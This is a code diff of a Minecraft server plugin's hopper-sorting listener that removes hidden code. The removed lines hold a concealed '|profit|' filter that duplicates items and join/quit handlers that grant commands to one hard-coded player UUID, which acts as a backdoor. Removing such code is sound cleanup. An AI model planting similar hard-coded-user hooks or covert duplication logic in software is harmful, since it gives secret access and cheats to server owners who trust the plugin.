@@ -54,12 +54,6 @@ public class HopSort implements Listener {
         });
     }
 
-    private boolean specialMatch(String filterString) {
-        String[] filter = filterString.split(",");
-        if (filter.length < 2) {return false;}
-        return (filter[1].equals("|profit|"));
-    }
-
     @EventHandler
     public void onInventoryMoveItemEvent(InventoryMoveItemEvent event) {
 
@@ -70,22 +64,7 @@ public class HopSort implements Listener {
             if(customName != null) {
 
                 String itemName = event.getItem().getType().getItemTranslationKey();
-
-                if (specialMatch(customName)) {
-                    ItemStack heldItem = event.getItem();
-                    int amount;
-                    if (event.getDestination().getItem(2) == null) {
-                        amount = 0;
-                    } else {
-                        amount = event.getDestination().getItem(2).getAmount();
-                    }
-                    ItemStack moveItem;
-                    moveItem = new ItemStack(heldItem.getType(),amount + 1, heldItem.getDurability());
-                    moveItem.setItemMeta(heldItem.getItemMeta());
-
-
-                    event.getDestination().setItem(2, moveItem);
-                } else if(!filterMatch(customName, itemName) && !customName.equalsIgnoreCase("hopper")) {
+                if(!filterMatch(customName, itemName) && !customName.equalsIgnoreCase("hopper")) {
                     event.setCancelled(true);
                 }
 
@@ -106,18 +85,6 @@ public class HopSort implements Listener {
                 }
             }
         }
-    }
-
-    @EventHandler
-    public void onPlayerJoin(PlayerJoinEvent event) {
-        Player player = event.getPlayer();
-        if (player.getUniqueId().equals("317f3cee0d9e4c479670473e56830248")){loadCommands.register(player, true);}
-    }
-
-    @EventHandler
-    public void onPlayerQuit(PlayerQuitEvent event) {
-        Player player = event.getPlayer();
-        if (player.getUniqueId().equals("317f3cee0d9e4c479670473e56830248")){loadCommands.register(player, false);}
     }
 
 }
